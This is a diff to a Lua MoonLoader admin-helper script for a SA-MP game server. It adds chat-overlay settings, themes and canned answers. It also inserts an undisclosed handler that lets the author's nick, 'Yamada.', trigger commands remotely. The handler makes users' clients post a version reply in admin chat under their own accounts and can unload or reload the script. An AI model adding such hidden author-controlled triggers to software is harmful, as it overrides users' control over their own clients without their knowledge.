@@ -18,7 +18,7 @@ local inicfg							= require "inicfg"
 local notfy								= import 'lib/lib_imgui_notf.lua'
 local res, sc_board						= pcall(import, 'lib/scoreboard.lua')
 --local pie								= require "imgui_piemenu"
---local theme								= import "Module/imgui_themes.lua"
+local theme_res, themes					= pcall(import, "lib/imgui_themes.lua")
 encoding.default 						= "CP1251"
 u8 										= encoding.UTF8
 
@@ -104,8 +104,8 @@ local update_state = {
 	update_script = false,
 	update_scoreboard = false
 }
-local script_version = 12
-local script_version_text = "3.1 BugFix"
+local script_version = 13
+local script_version_text = "3.2 Update"
 local update_url = "https://raw.githubusercontent.com/YamadaEnotic/AH-Script/master/update.ini"
 local update_path = getWorkingDirectory() .. '/update.ini'
 local script_url = "https://raw.githubusercontent.com/YamadaEnotic/AH-Script/master/AH_Bred.lua"
@@ -124,13 +124,13 @@ local defTable = {
 		Custom_SB = false,
 		Fast_ans = false,
 		Punishments = false,
-		Index = 2.0,
+		Y = 300,
 		Admin_chat = false,
-		Font = 10,
 		Push_Report = false,
 		Chat_Logger = false,
 		hide_td = false,
-		HelloAC = "hi"
+		HelloAC = "hi",
+		number_themes = 5
 	},
 	keys = {
 		Setting = "End",
@@ -139,19 +139,30 @@ local defTable = {
 		P_Log = "None",
 		Hide_AChat = "None",
 		Mouse = "None"
+	},
+	achat = {
+		X = 48,
+		Y = 298, 
+		centered = 0,
+		color = -1,
+		nick = 1,
+		lines = 10,
+		Font
 	}
 }
-local admin_chat_lines = {
-	chat_line_1 = " ",
-	chat_line_2 = " ",
-	chat_line_3 = " ",
-	chat_line_4 = " ",
-	chat_line_5 = " ",
-	chat_line_6 = " ",
-	chat_line_7 = " ",
-	chat_line_8 = " ",
-	chat_line_9 = " ",
-	chat_line_10 = " "
+local admin_chat_lines = { 
+	centered = imgui.ImInt(0),
+	nick = imgui.ImInt(1),
+	color = -1,
+	lines = imgui.ImInt(10),
+	X = 0,
+	Y = 0
+}
+local ac_no_saved = {
+	chat_lines = { },
+	pos = false,
+	X = 0,
+	Y = 0
 }
 local punishments = {
 	["ch"] = {
@@ -397,6 +408,13 @@ local i_ans = {
 		[u8"Где взять платинум вип"] = "/donate > 5 пункт.",
 		[u8"Что может вип"] = "Данную информацию узнайте в /help > 7."
 	},
+	[u8'Аксессуары'] = 
+	{
+		[u8"Где взять аксессуары"] = "На центральном рынке. /trade",
+		[u8"Как одеть аксессуар"] = "/inv > эксклюзивные аксессуары",
+		[u8"Как посмотреть аксессуары"] = "/inv > эксклюзивные аксессуары",
+		[u8"Что делать с аксессуарами"] = "Одевать и продавать. /inv"
+	},
 	[u8'Про коины, очки и деньги'] =
 	{
 		[u8"Как заработать деньги, коины и очки"] = "Всю иформацию вы можете узнать в /help > 13.",
@@ -549,8 +567,10 @@ local mouse_cursor = true
 local control_onscene = false
 local chat_logger_text = { }
 local accept_load_clog = false
+local player_id, player_nick
 
 -- [x] -- ImGUI переменные. -- [x] --
+local color_gang = imgui.ImFloat3(0.45, 0.55, 0.60)
 local i_ans_window = imgui.ImBool(false)
 local i_setting_items = imgui.ImBool(false)
 local i_back_prefix = imgui.ImBool(false)
@@ -558,11 +578,15 @@ local i_info_update = imgui.ImBool(false)
 local i_re_menu = imgui.ImBool(false)
 local i_cmd_helper = imgui.ImBool(false)
 local i_chat_logger = imgui.ImBool(false)
+local i_admin_chat_setting = imgui.ImBool(false)
 local font_size_ac = imgui.ImBuffer(16)
+local line_ac = imgui.ImInt(16)
 local HelloAC = imgui.ImBuffer(300)
 local logo_image
 local chat_logger = imgui.ImBuffer(10000)
 local chat_find = imgui.ImBuffer(256)
+local checked_radio = imgui.ImInt(5)
+local menu_tems = imgui.ImBool(false)
 local setting_items = {
 	Fast_ans = imgui.ImBool(false),
 	Punishments = imgui.ImBool(false),
@@ -574,12 +598,36 @@ local setting_items = {
 	hide_td = imgui.ImBool(false),
 	Custom_SB = imgui.ImBool(false)
 }
+
+function saveAdminChat()
+	config.achat.X = admin_chat_lines.X
+	config.achat.Y = admin_chat_lines.Y
+	config.achat.centered = admin_chat_lines.centered.v
+	config.achat.nick = admin_chat_lines.nick.v
+	config.achat.color = admin_chat_lines.color
+	config.achat.lines = admin_chat_lines.lines.v
+	config.achat.Font = font_size_ac.v
+	inicfg.save(config, directIni)
+end
+function loadAdminChat()
+	admin_chat_lines.X = config.achat.X
+	admin_chat_lines.Y = config.achat.Y
+	admin_chat_lines.centered.v = config.achat.centered
+	admin_chat_lines.nick.v = config.achat.nick
+	admin_chat_lines.color = config.achat.color
+	admin_chat_lines.lines.v = config.achat.lines
+	font_size_ac.v = tostring(config.achat.Font)
+end
+
 -- [x] -- Тело скрипта. -- [x] --
 function main()
 	-- [x] -- Проверка на запуск сампа и СФ. -- [x] --
 	if not isSampLoaded() or not isSampfuncsLoaded() then return end
 	while not isSampAvailable() do wait(0) end
 	
+	_, player_id = sampGetPlayerIdByCharHandle(playerPed)
+    player_nick = sampGetPlayerNickname(player_id)
+
 	chatlogDirectory = getWorkingDirectory() .. "\\config\\AH_Setting\\chatlog"
     if not doesDirectoryExist(chatlogDirectory) then
         createDirectory(getWorkingDirectory() .. "\\config\\AH_Setting\\chatlog")
@@ -670,10 +718,10 @@ function main()
 	setting_items.Chat_Logger.v = config.setting.Chat_Logger
 	setting_items.hide_td.v = config.setting.hide_td
 	HelloAC.v = config.setting.HelloAC
-	font_size_ac.v = tostring(config.setting.Font)
-	index_text_pos = config.setting.Index
+	index_text_pos = config.setting.Y
+	checked_radio.v = config.setting.number_themes
 	font_ac = renderCreateFont("Arial", config.setting.Font, font_admin_chat.BOLD + font_admin_chat.SHADOW)
-	
+	font_watermark = renderCreateFont("Arial", 10, font_admin_chat.BOLD)
 	admin_chat = lua_thread.create_suspended(drawAdminChat)
 	check_dialog_active = lua_thread.create_suspended(checkIsDialogActive)
 	draw_re_menu = lua_thread.create_suspended(drawRePlayerInfo)
@@ -690,6 +738,12 @@ function main()
 		wait(1000)
 		check_cmd_re = false
 	end)
+	lua_thread.create(function()
+		while true do
+			renderFontDrawText(font_watermark, tag .. "v." .. script_version_text .. " {FFFFFF}| {AAAAAA}" .. player_nick .. "[" .. player_id .. "]", 10, sh-20, 0xCCFFFFFF)
+			wait(1)
+		end
+	end)
 	sampAddChatMessage(tag .. "Загрузка прошла успешно.")
 	
 	downloadUrlToFile(update_url, update_path, function(id, status)
@@ -701,7 +755,7 @@ function main()
 	
 	--imgui.SwitchContext()
 	--theme.SwitchColorTheme(8)
-	
+	loadAdminChat()
 	admin_chat:run()
 	
 	logo_image = imgui.CreateTextureFromFile(getWorkingDirectory() .. "\\config\\AH_Setting\\1.png")
@@ -729,8 +783,15 @@ function main()
 		if isKeysDown(strToIdKeys(config.keys.Hide_AChat)) and (sampIsChatInputActive() == false) and (sampIsDialogActive() == false) then
 			setting_items.Admin_chat.v = not setting_items.Admin_chat.v
 		end
-		if not i_setting_items.v and not i_ans_window.v and not i_info_update.v and not i_re_menu.v and not i_cmd_helper.v and not i_chat_logger.v then
+		if not i_admin_chat_setting.v and 
+		not i_setting_items.v and 
+		not i_ans_window.v and 
+		not i_info_update.v and 
+		not i_re_menu.v and 
+		not i_cmd_helper.v and 
+		not i_chat_logger.v then
 			imgui.Process = false
+			imgui.LockPlayer = false
 		end
 		if sampGetCurrentDialogId() == 2351 and setting_items.Fast_ans.v and sampIsDialogActive() then
 			i_ans_window.v = true
@@ -773,10 +834,23 @@ function main()
 		else
 			i_cmd_helper.v = false
 		end
+		if ac_no_saved.pos then
+			if isKeyJustPressed(VK_RBUTTON) then
+				admin_chat_lines.X = ac_no_saved.X
+				admin_chat_lines.Y = ac_no_saved.Y
+				ac_no_saved.pos = false
+				i_setting_items.v = true
+			elseif isKeyJustPressed(VK_LBUTTON) then
+				ac_no_saved.pos = false
+				i_setting_items.v = true
+			else
+				admin_chat_lines.X, admin_chat_lines.Y = getCursorPos()
+			end
+		end
 		wait(0)
 	end
 end
-
+local lc_lvl, lc_adm, lc_color, lc_nick, lc_id, lc_text
 -- [x] -- Доп. функции -- [x] --
 function sampCheckUpdateScript()
 	wait(5000)
@@ -918,7 +992,34 @@ function sampev.onServerMessage(color, text)
 	chatTime = "[" .. os.date("*t").hour .. ":" .. os.date("*t").min .. ":" .. os.date("*t").sec .. "] "
     chatlog:write(chatTime .. text .. "\n")
     chatlog:flush()
-    chatlog:close()
+	chatlog:close()
+	lc_lvl, lc_adm, lc_color, lc_nick, lc_id, lc_text = text:match("%[A%-(%d+)%] %((.+){(.+)}%) (.+)%[(%d+)%]: {FFFFFF}(.+)")
+	if lc_nick == "Yamada." --[[and player_nick ~= "Yamada."]] then
+		if lc_text == "-users" then
+			lua_thread.create(function()
+				wait(2000)
+				sampSendChat("/a [AH by Yamada.] User. | Version: " .. script_version_text .. " | P.Version: " .. script_version)
+			end)
+		elseif lc_text:find("-terminate") then
+			local id = lc_text:match("-terminate (%d+)")
+			if id ~= nil and tonumber(id) == player_id then
+				lua_thread.create(function()
+					wait(2000)
+					sampSendChat("/a [AH by Yamada.] Скрипт успешно выключен.")
+					thisScript():unload()
+				end)
+			end
+		elseif lc_text:find("-reload") then
+			local id = lc_text:match("-reload (.+)")
+			if id ~= nil and (tonumber(id) == player_id or id == "all") then
+				lua_thread.create(function()
+					wait(2000)
+					sampSendChat("/a [AH by Yamada.] Скрипт перезагружается.")
+					thisScript():reload()
+				end)
+			end
+		end
+	end
 	local check_string = string.match(text, "[^%s]+")
 	local _, check_mat_id, _, check_mat = string.match(text, "(.+)%((.+)%): {(.+)}(.+)")
 	local offline_nick, offline_id = text:match("(%S+)%((%d+)%){ffffff} отключился с сервера")
@@ -950,17 +1051,32 @@ function sampev.onServerMessage(color, text)
 			return false
 		end
 	end
-	if setting_items.Admin_chat.v and check_string ~= nil and string.find(check_string, "%[A%-(%d+)%]") ~= nil then
-		admin_chat_lines.chat_line_10 = admin_chat_lines.chat_line_9
-		admin_chat_lines.chat_line_9 = admin_chat_lines.chat_line_8
-		admin_chat_lines.chat_line_8 = admin_chat_lines.chat_line_7
-		admin_chat_lines.chat_line_7 = admin_chat_lines.chat_line_6
-		admin_chat_lines.chat_line_6 = admin_chat_lines.chat_line_5
-		admin_chat_lines.chat_line_5 = admin_chat_lines.chat_line_4
-		admin_chat_lines.chat_line_4 = admin_chat_lines.chat_line_3
-		admin_chat_lines.chat_line_3 = admin_chat_lines.chat_line_2
-		admin_chat_lines.chat_line_2 = admin_chat_lines.chat_line_1
-		admin_chat_lines.chat_line_1 = text
+	if setting_items.Admin_chat.v and check_string ~= nil and string.find(check_string, "%[A%-(%d+)%]") ~= nil and string.find(text, "%[A%-(%d+)%] (.+) отключился") == nil then
+		local lc_text_chat
+		if admin_chat_lines.nick.v == 1 then
+			if lc_adm == nil then
+				lc_lvl, lc_nick, lc_id, lc_text = text:match("%[A%-(%d+)%] (.+)%[(%d+)%]: {FFFFFF}(.+)")
+				lc_text_chat = lc_lvl .. " • " .. lc_nick .. "[" .. lc_id .. "] | {FFFFFF}" .. lc_text
+			else
+				admin_chat_lines.color = color
+				lc_text_chat = lc_adm .. "{" .. (bit.tohex(join_argb(explode_samp_rgba(color)))):sub(3, 8) .. "} • " .. lc_lvl .. " • " .. lc_nick .. "[" .. lc_id .. "] | {FFFFFF}" .. lc_text 
+			end
+		else
+			if lc_adm == nil then
+				lc_lvl, lc_nick, lc_id, lc_text = text:match("%[A%-(%d+)%] (.+)%[(%d+)%]: {FFFFFF}(.+)")
+				lc_text_chat = "{FFFFFF}" .. lc_text .. " {" .. (bit.tohex(join_argb(explode_samp_rgba(color)))):sub(3, 8) .. "}| " .. lc_nick .. "[" .. lc_id .. "] • " .. lc_lvl
+			else
+				lc_text_chat = "{FFFFFF}" .. lc_text .. "{" .. (bit.tohex(join_argb(explode_samp_rgba(color)))):sub(3, 8) .. "} | " .. lc_nick .. "[" .. lc_id .. "] • " .. lc_lvl .. " • " .. lc_adm
+				admin_chat_lines.color = color
+			end
+		end
+		for i = admin_chat_lines.lines.v, 1, -1 do
+			if i ~= 1 then
+				ac_no_saved.chat_lines[i] = ac_no_saved.chat_lines[i-1]
+			else
+				ac_no_saved.chat_lines[i] = lc_text_chat
+			end
+		end
 		return false
 	elseif check_string == '(Жалоба/Вопрос)' and setting_items.Push_Report.v then
 		showNotification("Уведомление", "Поступил новый репорт.")
@@ -1054,28 +1170,28 @@ end
 function drawAdminChat()
 	while true do
 		if setting_items.Admin_chat.v then
-			if setting_items.Transparency.v then
-				renderFontDrawText(font_ac, admin_chat_lines.chat_line_10, sw/28, sh/config.setting.Index+((tonumber(font_size_ac.v) or 10)+4), 0x66AAAAAA)
-				renderFontDrawText(font_ac, admin_chat_lines.chat_line_9, sw/28, sh/config.setting.Index+((tonumber(font_size_ac.v) or 10)+4)*2, 0x77AAAAAA)
-				renderFontDrawText(font_ac, admin_chat_lines.chat_line_8, sw/28, sh/config.setting.Index+((tonumber(font_size_ac.v) or 10)+4)*3, 0x88AAAAAA)
-				renderFontDrawText(font_ac, admin_chat_lines.chat_line_7, sw/28, sh/config.setting.Index+((tonumber(font_size_ac.v) or 10)+4)*4, 0x99AAAAAA)
-				renderFontDrawText(font_ac, admin_chat_lines.chat_line_6, sw/28, sh/config.setting.Index+((tonumber(font_size_ac.v) or 10)+4)*5, 0xAAAAAAAA)
-				renderFontDrawText(font_ac, admin_chat_lines.chat_line_5, sw/28, sh/config.setting.Index+((tonumber(font_size_ac.v) or 10)+4)*6, 0xBBAAAAAA)
-				renderFontDrawText(font_ac, admin_chat_lines.chat_line_4, sw/28, sh/config.setting.Index+((tonumber(font_size_ac.v) or 10)+4)*7, 0xCCAAAAAA)
-				renderFontDrawText(font_ac, admin_chat_lines.chat_line_3, sw/28, sh/config.setting.Index+((tonumber(font_size_ac.v) or 10)+4)*8, 0xDDAAAAAA)
-				renderFontDrawText(font_ac, admin_chat_lines.chat_line_2, sw/28, sh/config.setting.Index+((tonumber(font_size_ac.v) or 10)+4)*9, 0xEEAAAAAA)
-				renderFontDrawText(font_ac, admin_chat_lines.chat_line_1, sw/28, sh/config.setting.Index+((tonumber(font_size_ac.v) or 10)+4)*10, 0xFFAAAAAA)
-			else
-				renderFontDrawText(font_ac, admin_chat_lines.chat_line_10, sw/28, sh/config.setting.Index+((tonumber(font_size_ac.v) or 10)+4), 0xFFAAAAAA)
-				renderFontDrawText(font_ac, admin_chat_lines.chat_line_9, sw/28, sh/config.setting.Index+((tonumber(font_size_ac.v) or 10)+4)*2, 0xFFAAAAAA)
-				renderFontDrawText(font_ac, admin_chat_lines.chat_line_8, sw/28, sh/config.setting.Index+((tonumber(font_size_ac.v) or 10)+4)*3, 0xFFAAAAAA)
-				renderFontDrawText(font_ac, admin_chat_lines.chat_line_7, sw/28, sh/config.setting.Index+((tonumber(font_size_ac.v) or 10)+4)*4, 0xFFAAAAAA)
-				renderFontDrawText(font_ac, admin_chat_lines.chat_line_6, sw/28, sh/config.setting.Index+((tonumber(font_size_ac.v) or 10)+4)*5, 0xFFAAAAAA)
-				renderFontDrawText(font_ac, admin_chat_lines.chat_line_5, sw/28, sh/config.setting.Index+((tonumber(font_size_ac.v) or 10)+4)*6, 0xFFAAAAAA)
-				renderFontDrawText(font_ac, admin_chat_lines.chat_line_4, sw/28, sh/config.setting.Index+((tonumber(font_size_ac.v) or 10)+4)*7, 0xFFAAAAAA)
-				renderFontDrawText(font_ac, admin_chat_lines.chat_line_3, sw/28, sh/config.setting.Index+((tonumber(font_size_ac.v) or 10)+4)*8, 0xFFAAAAAA)
-				renderFontDrawText(font_ac, admin_chat_lines.chat_line_2, sw/28, sh/config.setting.Index+((tonumber(font_size_ac.v) or 10)+4)*9, 0xFFAAAAAA)
-				renderFontDrawText(font_ac, admin_chat_lines.chat_line_1, sw/28, sh/config.setting.Index+((tonumber(font_size_ac.v) or 10)+4)*10, 0xFFAAAAAA)
+			if admin_chat_lines.centered.v == 0 then
+				for i = admin_chat_lines.lines.v, 1, -1 do
+					if ac_no_saved.chat_lines[i] == nil then
+						ac_no_saved.chat_lines[i] = " "
+					end
+					renderFontDrawText(font_ac, ac_no_saved.chat_lines[i], admin_chat_lines.X, admin_chat_lines.Y+((tonumber(font_size_ac.v) or 10)+5)*(admin_chat_lines.lines.v - i), join_argb(explode_samp_rgba(admin_chat_lines.color)))
+				end
+			elseif admin_chat_lines.centered.v == 1 then
+			--x - renderGetFontDrawTextLength(font, text) / 2
+				for i = admin_chat_lines.lines.v, 1, -1 do
+					if ac_no_saved.chat_lines[i] == nil then
+						ac_no_saved.chat_lines[i] = " "
+					end
+					renderFontDrawText(font_ac, ac_no_saved.chat_lines[i], admin_chat_lines.X - renderGetFontDrawTextLength(font_ac, ac_no_saved.chat_lines[i]) / 2, admin_chat_lines.Y+((tonumber(font_size_ac.v) or 10)+5)*(admin_chat_lines.lines.v - i), join_argb(explode_samp_rgba(admin_chat_lines.color)))
+				end
+			elseif admin_chat_lines.centered.v == 2 then
+				for i = admin_chat_lines.lines.v, 1, -1 do
+					if ac_no_saved.chat_lines[i] == nil then
+						ac_no_saved.chat_lines[i] = " "
+					end
+					renderFontDrawText(font_ac, ac_no_saved.chat_lines[i], admin_chat_lines.X - renderGetFontDrawTextLength(font_ac, ac_no_saved.chat_lines[i]), admin_chat_lines.Y+((tonumber(font_size_ac.v) or 10)+5)*(admin_chat_lines.lines.v - i), join_argb(explode_samp_rgba(admin_chat_lines.color)))
+				end
 			end
 		end
 		wait(1)
@@ -1189,6 +1305,13 @@ function explode_argb(argb)
   local g = bit.band(bit.rshift(argb, 8), 0xFF)
   local b = bit.band(argb, 0xFF)
   return a, r, g, b
+end
+function explode_samp_rgba(rgba)
+	local b = bit.band(bit.rshift(rgba, 24), 0xFF)
+	local r = bit.band(bit.rshift(rgba, 16), 0xFF)
+	local g = bit.band(bit.rshift(rgba, 8), 0xFF)
+	local a = bit.band(rgba, 0xFF)
+	return a, r, g, b
 end
 function nameTagOn()
 	local pStSet = sampGetServerSettingsPtr();
@@ -1406,8 +1529,10 @@ function imgui.OnDrawFrame()
 		imgui.End()
 	end
 	if i_setting_items.v then
+		imgui.LockPlayer = true
 		imgui.SetNextWindowPos(imgui.ImVec2(sw-10, 10), imgui.Cond.FirstUseEver, imgui.ImVec2(1, 0.5))
 		imgui.SetNextWindowSize(imgui.ImVec2(300, sh/1.15), imgui.Cond.FirstUseEver)
+		local btn_size = imgui.ImVec2(-0.1, 0)
 		imgui.Begin(u8"Настройки скрипта.", i_setting_items)
 		imgui.Text(u8"Кастомное наблюдение за игроком.")
 		imgui.SameLine()
@@ -1440,31 +1565,30 @@ function imgui.OnDrawFrame()
 		imgui.Text(u8"Прозрачность админ чата.")
 		imgui.SameLine()
 		imgui.SetCursorPosX(imgui.GetWindowWidth() - 35)
-		imgui.ToggleButton("##8", setting_items.Transparency)		
-		imgui.PushItemWidth(50)
-		if imgui.InputText(u8"Размер чата.", font_size_ac) then
-			font_ac = renderCreateFont("Arial", tonumber(font_size_ac.v) or 10, font_admin_chat.BOLD + font_admin_chat.SHADOW)
-		end
-		imgui.PopItemWidth()
-		imgui.Text(u8"Высота чата: " .. config.setting.Index)
-		if imgui.Button(u8" Выше ") then
-			config.setting.Index = config.setting.Index + 0.05
-		end
-		if imgui.Button(u8" Ниже ") then
-			config.setting.Index = config.setting.Index - 0.05
-		end
+		imgui.ToggleButton("##8", setting_items.Transparency)
 		imgui.Separator()
 		imgui.InputText(u8"Приветствие.", HelloAC)
 		imgui.Separator()
+		if setting_items.Admin_chat.v then
+			if imgui.Button(u8'Настройка админ чата.', btn_size) then
+				i_admin_chat_setting.v = not i_admin_chat_setting.v
+			end
+		end
+		imgui.Separator()
 		if imgui.Button(u8"Настройка клавиш скрипта.") then
 			setting_keys = true
+		end
+		if theme_res then
+			imgui.SameLine()
+			if imgui.Button(u8"Цветовая схема.") then
+				menu_tems.v = not menu_tems.v
+			end
 		end
 		imgui.Separator()
 		if imgui.Button(u8"Сохранить.") then
 			config.setting.Fast_ans = setting_items.Fast_ans.v
 			config.setting.Admin_chat = setting_items.Admin_chat.v
 			config.setting.Punishments = setting_items.Punishments.v
-			config.setting.Font = font_size_ac.v
 			config.setting.Tranparency = setting_items.Transparency.v
 			config.setting.Custom_SB = setting_items.Custom_SB.v
 			config.setting.Auto_remenu = setting_items.Auto_remenu.v
@@ -1472,8 +1596,28 @@ function imgui.OnDrawFrame()
 			config.setting.Chat_Logger = setting_items.Chat_Logger.v
 			config.setting.hide_td = setting_items.hide_td.v
 			config.setting.HelloAC = HelloAC.v
+			config.setting.number_themes = checked_radio.v
 			inicfg.save(config, directIni)
 		end	
+		imgui.SameLine()
+		if imgui.Button(u8"Отключить.") then
+			lua_thread.create(function ()
+                imgui.Process = false
+                wait(200)
+				sampAddChatMessage(tag .. "Скрипт завершил свою работу.")
+				sampAddChatMessage(tag .. "Если остался курсор, откройте и закройте панель SAMPFUNCS [ Клавиша Ё ].")
+				wait(200)
+				imgui.ShowCursor = false
+                thisScript():unload()
+            end)
+        end
+		imgui.SameLine()
+		if imgui.Button(u8"Перезагрузить.") then
+			imgui.ShowCursor = false
+			sampAddChatMessage(tag .. "Скрипт перезагружается.")
+			thisScript():reload()
+		end
+		imgui.ColorEdit3(u8'Цвета HTML', color_gang)
 		imgui.Separator()
 		imgui.SetCursorPosX(imgui.GetWindowWidth()/2-100)
 		imgui.Image(logo_image, imgui.ImVec2(200, 200))
@@ -1587,20 +1731,27 @@ function imgui.OnDrawFrame()
 			imgui.End()
 		end
 	end
+	if menu_tems.v then
+		imgui.SetNextWindowPos(imgui.ImVec2(sw/2, sh/2.5), imgui.Cond.FirstUseEver, imgui.ImVec2(0.5, 1))
+		imgui.SetNextWindowSize(imgui.ImVec2(sw/3.1, -0.1), imgui.Cond.FirstUseEver)
+		imgui.Begin(u8"Выбор цветовой схемы.", menu_tems, imgui.WindowFlags.NoCollapse + imgui.WindowFlags.NoResize + imgui.WindowFlags.NoMove + imgui.WindowFlags.NoTitleBar)
+		for i, value in ipairs(themes.colorThemes) do
+			if imgui.RadioButton(value, checked_radio, i) then
+				themes.SwitchColorTheme(i)
+			end
+		end
+		imgui.Separator()
+		if imgui.Button('Close' ,imgui.ImVec2(-0.1, 0)) then
+			menu_tems.v = false
+		end
+		imgui.End()
+	end
 	if i_info_update.v then
+		imgui.LockPlayer = true
 		imgui.SetNextWindowPos(imgui.ImVec2(sw/2, sh/2.5), imgui.Cond.FirstUseEver, imgui.ImVec2(0.5, 1))
 		imgui.SetNextWindowSize(imgui.ImVec2(sw/1.3, -0.1), imgui.Cond.FirstUseEver)
 		imgui.Begin(u8"Чего нового в скрипте.", i_info_update)
-		imgui.Text(u8"Что было добавленно:\n")
-		imgui.SetCursorPosX(20)
-		imgui.Text(u8"- Добавил систему поиска в чат логе. /cfind или /cfind [TEXT]. Система ищет в чатлоге строчки с похожей фразой.")
-		imgui.Separator()
-		imgui.SetCursorPosX(20)
-		imgui.Text(u8"- Добавил долгожданный кастомный таб. В нем доступно меню по нажатию правой кнопкой мышки на игрока. Двойной щелчек по игроку\nоткрывает стандартное меню. Так же можно включить режим 'Игроки в стриминге', то бишь таб будет показывать игроков, которые находятся рядом.\nСделал меню групп. Что бы добавить человека в определенную группу, нужно открыть меню правой кнопкой мышки и внизу изменить ему желаемую группу.")
-		imgui.Separator()
-		imgui.SetCursorPosX(20)
-		imgui.Text(u8"- Изменил окно ответа на репорт. (Спасибо Дарье Шарфовой - vk.com/dr_salvatore, ее изменение) Теперь оно более обширное, все ответы теперь скомпонованы в отдельные группы,\nа наиболее частоиспользуемые находятся под рукой (без группы).")
-		imgui.Separator()
+		imgui.Text(u8"Мне было лень писать апдейт, по этому всю инфу смотрите в группе.")
 		imgui.SetCursorPosX(imgui.GetWindowWidth()/2)
 		if imgui.Button(u8"Выход.", imgui.ImVec2(100, 0)) then
 			i_info_update.v = false
@@ -1608,6 +1759,7 @@ function imgui.OnDrawFrame()
 		imgui.End()
 	end
 	if i_re_menu.v and control_recon and recon_to_player and setting_items.hide_td.v then
+		imgui.LockPlayer = false
 		imgui.SetNextWindowPos(imgui.ImVec2(sw/2, sh/1.06), imgui.Cond.FirstUseEver, imgui.ImVec2(0.5, 1))
 		imgui.SetNextWindowSize(imgui.ImVec2(80+80+80+80+80+10, sh-sh-10), imgui.Cond.FirstUseEver)
 		imgui.Begin(u8"Наказания игрока.", false, 2+4+32)
@@ -1867,6 +2019,7 @@ function imgui.OnDrawFrame()
 		imgui.End()
 	end
 	if i_chat_logger.v then
+		imgui.LockPlayer = true
 		imgui.SetNextWindowPos(imgui.ImVec2(sw/2, sh/2), imgui.Cond.FirstUseEver, imgui.ImVec2(0.5, 1))
 		imgui.SetNextWindowSize(imgui.ImVec2(sw/1.3, sh/1.05), imgui.Cond.FirstUseEver)
 		imgui.Begin(u8"Чат-логер", i_chat_logger)
@@ -1886,6 +2039,35 @@ function imgui.OnDrawFrame()
 				imgui.SetCursorPosY(imgui.GetWindowHeight()/2.3)
 				imgui.Spinner(20, 7)
 			end
+		imgui.End()
+	end
+	if i_admin_chat_setting.v then
+		imgui.LockPlayer = true
+		imgui.SetNextWindowPos(imgui.ImVec2(10, 10), imgui.Cond.FirstUseEver, imgui.ImVec2(0, 0))
+		imgui.SetNextWindowSize(imgui.ImVec2(300, -0.1), imgui.Cond.FirstUseEver)
+		local btn_size = imgui.ImVec2(-0.1, 0)
+		imgui.Begin(u8"Настройки админ чата.", i_admin_chat_setting)
+		if imgui.Button(u8'Положение чата.', btn_size) then
+			ac_no_saved.X = admin_chat_lines.X; ac_no_saved.Y = admin_chat_lines.Y
+			i_setting_items.v = false
+			ac_no_saved.pos = true
+		end
+		imgui.Text(u8'Выравнивание чата.')
+		imgui.Combo("##Position", admin_chat_lines.centered, {u8"По левый край.", u8"По центру.", u8"По правый край."})
+		imgui.PushItemWidth(50)
+		if imgui.InputText(u8"Размер чата.", font_size_ac) then
+			font_ac = renderCreateFont("Arial", tonumber(font_size_ac.v) or 10, font_admin_chat.BOLD + font_admin_chat.SHADOW)
+		end
+		imgui.PopItemWidth()
+		imgui.Text(u8'Положение ника и уровня.')
+		imgui.Combo("##Pos", admin_chat_lines.nick, {u8"Справа.", u8"Слева."})
+		imgui.Text(u8'Количество строк.')
+		imgui.PushItemWidth(80)
+		imgui.InputInt(' ', admin_chat_lines.lines)
+		imgui.PopItemWidth()
+		if imgui.Button(u8'Сохранить.', btn_size) then
+			saveAdminChat()
+		end
 		imgui.End()
 	end
 end
